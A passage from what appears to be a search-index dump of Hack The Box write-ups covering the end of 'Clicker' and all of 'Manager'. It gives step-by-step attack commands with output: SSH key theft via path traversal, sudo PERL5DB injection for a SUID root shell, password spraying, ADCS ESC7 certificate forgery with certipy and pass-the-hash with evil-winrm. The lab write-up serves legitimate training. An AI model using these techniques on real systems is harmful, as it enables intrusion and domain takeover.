folder, which we don't have access. However, we can read the private SSH key with this mechanism:  www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa mysql: [Warning] Using a password on the command line interface can be insecure. -------------- -----BEGIN OPENSSH PRIVATE KEY--- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn   Now we just need to adapt the private key format comparing with some valid private key and boom, we are in as jack:  ssh jack@clicker.htb -i ../exfil/priv_key   And we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#privilege-escalation","content":" sudo -l shows interesting stuff:  User jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh   First of all, we try to run the monitoring script to see what happens:  jack@clicker:~$ sudo /opt/monitor.sh &lt;?xml version=&quot;1.0&quot;?&gt; &lt;data&gt;   An potential way to exploit this, is set the EUID to a number different than 0 so that it enters in the if when the user is not root:  #!/bin/bash if [ &quot;$EUID&quot; -ne 0 ] then echo &quot;Error, please run as root&quot; exit fi set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin unset PERL5LIB; unset PERLLIB;   The PATH is not well protected and if we provide the proper PATH variable, we can make echo program to point to our fradulent implementation ... Let's give it a try ...  Interesting, this technique does not seem to work with echo for some kind of reason but work with ls for instance. Looks like echo is a bult-in executable in the shell and does not use the PATH variable to determine where is it.  We can use PERL5OPT to set the debugger flag for perl and PERL5DB to specify the command we want to use as a debugger:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;ls&quot;);' /opt/monitor.sh queries user.txt   However, if we try to get a shell from here, we'll fail:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;/bin/bash&quot;);' /opt/monitor.sh /bin/bash: line 1: syntax error near unexpected token `newline' /bin/bash: line 1: `&lt;?xml version=&quot;1.0&quot;?&gt;' No DB::DB routine defined at /usr/bin/xml_pp line 9. No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870. END failed--call queue aborted.   But, we can do a nasty thing, we can set the SUID flag so that if keeps the root permission, even if the user is not root:  sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.sh jack@clicker:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bash   If we run bash normally we'll not get the root console:  jack@clicker:~$ bash bash-5.1$ whoami jack   However, there's a flag -p in bash to use the effective user id instead of the real user id:  jack@clicker:~$ bash -p bash-5.1# whoami root   And now we can read the root flag. ","version":"Next","tagName":"h2"},{"title":"Manager","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/manager","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#enumeration","content":" There are a lot of ports opened ...  └─$ nmap 10.10.11.236 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 20:09 CET Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 50.00% done; ETC: 20:09 (0:00:02 remaining) Nmap scan report for 10.10.11.236 Host is up (0.045s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain Simple DNS Plus Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Manager | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows PORT STATE SERVICE VERSION 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-03 01:14:27Z) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 139/tcp open netbios-ssn Microsoft Windows netbios-ssn Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-01-03T01:17:01+00:00; +5h59m52s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows 445/tcp open microsoft-ds? Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 5h59m51s | smb2-time: | date: 2024-01-03T01:17:48 |_ start_date: N/A 464/tcp open kpasswd5 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2024-01-03T01:20:28+00:00; +5h59m52s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 5h59m51s 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2024-01-03T01:21:19+00:00; +5h59m52s from scanner time. | ms-sql-info: | 10.10.11.236:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 10.10.11.236:1433: | Target_Name: MANAGER | NetBIOS_Domain_Name: MANAGER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: manager.htb | DNS_Computer_Name: dc01.manager.htb | DNS_Tree_Name: manager.htb |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-12-21T20:26:45 |_Not valid after: 2053-12-21T20:26:45 Host script results: |_clock-skew: mean: 5h59m51s, deviation: 0s, median: 5h59m51s 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-01-03T01:22:42+00:00; +5h59m53s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 5h59m52s 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2024-01-03T01:24:11+00:00; +5h59m52s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows   Samba is open, so we can enumerate the shares:  └─$ smbclient -L \\\\dc01.manager.htb -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to dc01.manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#foothold","content":" We can use crackmapexec to brute-force the users:  ┌──(gal㉿gal)-[~/workspace/gal/htb] └─$ crackmapexec smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute 10000 SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) SMB 10.10.11.236 445 DC01 [+] manager.htb\\anonymous: SMB 10.10.11.236 445 DC01 [+] Brute forcing RIDs SMB 10.10.11.236 445 DC01 498: MANAGER\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 500: MANAGER\\Administrator (SidTypeUser) SMB 10.10.11.236 445 DC01 501: MANAGER\\Guest (SidTypeUser) SMB 10.10.11.236 445 DC01 502: MANAGER\\krbtgt (SidTypeUser) SMB 10.10.11.236 445 DC01 512: MANAGER\\Domain Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 513: MANAGER\\Domain Users (SidTypeGroup) SMB 10.10.11.236 445 DC01 514: MANAGER\\Domain Guests (SidTypeGroup) SMB 10.10.11.236 445 DC01 515: MANAGER\\Domain Computers (SidTypeGroup) SMB 10.10.11.236 445 DC01 516: MANAGER\\Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 517: MANAGER\\Cert Publishers (SidTypeAlias) SMB 10.10.11.236 445 DC01 518: MANAGER\\Schema Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 519: MANAGER\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 520: MANAGER\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.236 445 DC01 521: MANAGER\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 522: MANAGER\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 525: MANAGER\\Protected Users (SidTypeGroup) SMB 10.10.11.236 445 DC01 526: MANAGER\\Key Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 527: MANAGER\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 553: MANAGER\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.236 445 DC01 571: MANAGER\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.236 445 DC01 572: MANAGER\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.236 445 DC01 1000: MANAGER\\DC01$ (SidTypeUser) SMB 10.10.11.236 445 DC01 1101: MANAGER\\DnsAdmins (SidTypeAlias) SMB 10.10.11.236 445 DC01 1102: MANAGER\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.236 445 DC01 1103: MANAGER\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias) SMB 10.10.11.236 445 DC01 1113: MANAGER\\Zhong (SidTypeUser) SMB 10.10.11.236 445 DC01 1114: MANAGER\\Cheng (SidTypeUser) SMB 10.10.11.236 445 DC01 1115: MANAGER\\Ryan (SidTypeUser) SMB 10.10.11.236 445 DC01 1116: MANAGER\\Raven (SidTypeUser) SMB 10.10.11.236 445 DC01 1117: MANAGER\\JinWoo (SidTypeUser) SMB 10.10.11.236 445 DC01 1118: MANAGER\\ChinHae (SidTypeUser) SMB 10.10.11.236 445 DC01 1119: MANAGER\\Operator (SidTypeUser)   So far, we found the following users:  zhongchengryanravenjinwoochinhaeoperator  We have a complete version number: Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  Now we can do password spraying with the users:  crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users   And we found out the username and password for operator:  SMB 10.10.11.236 445 DC01 [+] manager.htb\\operator:operator   ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#lateral-movement","content":" With that user we cannot do much, if we try to connect with evil-winrm, we will get connection refused.  LDAP is opened, we can try to dump all the contents of it:  ldapdomaindump 10.10.11.236 -u 'manager.htb\\operator' -p 'operator' --no-json --no-grep   MS SQL is also open, so we can try to connect using the found user/password:  mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (MANAGER\\Operator guest@master)&gt;   Here, it looks like we have permission to read the file structure:  SQL (MANAGER\\Operator guest@master)&gt; EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; subdirectory depth file ------------------------------- ----- ---- about.html 1 1 contact.html 1 1 css 1 0 images 1 0 index.html 1 1 js 1 0 service.html 1 1 web.config 1 1 website-backup-27-07-23-old.zip 1 1   Now we have two interesting files to check: web.config and website-backup ...  The web.config is protected, so we can't download it, however we are able to download the backup...  In the backup we can find the user and password for a user that is in the Remote Management Users which sounds good...  &lt;user&gt;raven@manager.htb&lt;/user&gt; &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;   With those credentials, we can use evil-winrm and get the user flag.  evil-winrm -i dc01.manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'   ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#privilege-escalation","content":" Could not get it in time, but here's how it was done by another people: https://0xdf.gitlab.io/2024/03/16/htb-manager.html#box-info  After getting the user flag, a little bit of lurking around the machine did not provide anything interesting. So, we'll explore Active Directoy Certificate Service with certipy.  certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout [!] Vulnerabilities ESC7 : 'MANAGER.HTB\\\\Raven' has dangerous permissions   Nice, now we can explote this ESC7 vulnerability: ESC7 is when a user has either the &quot;Manage CA&quot; or &quot;Manage Certificates&quot; access rights on the certificate authority itself. Raven has ManageCa rights.  First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:  certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Successfully added officer 'Raven' on 'manager-DC01-CA'   Now raven appears in the find as certificate manager:  certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout ...[snip]... ManageCertificates : MANAGER.HTB\\Administrators MANAGER.HTB\\Domain Admins MANAGER.HTB\\Enterprise Admins MANAGER.HTB\\Raven   Now, we will try to retrieve the Administrator certificate to connect with evil-winrm as administrator.  First: Request the admin cert:  certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. [*] Request ID is 13 Would you like to save the private key? (y/N) y [*] Saved private key to 13.key [-] Failed to request certificate   This fails, but we can keep the private key. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:  certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Successfully issued certificate   Now, the issued certificate can be retrieved using the req command:  certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Rerieving certificate with ID 13 [*] Successfully retrieved certificate [*] Got certificate with UPN 'administrator@manager.htb' [*] Certificate has no object SID [*] Loaded private key from '13.key' [*] Saved certificate and private key to 'administrator.pfx'   With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync.  certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@manager.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef   With the hash, we can connec to evil-winrm:  oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;   and grab the root.txt file ","version":"Next","tagName":"h2"}],"options":{"id":"default"}}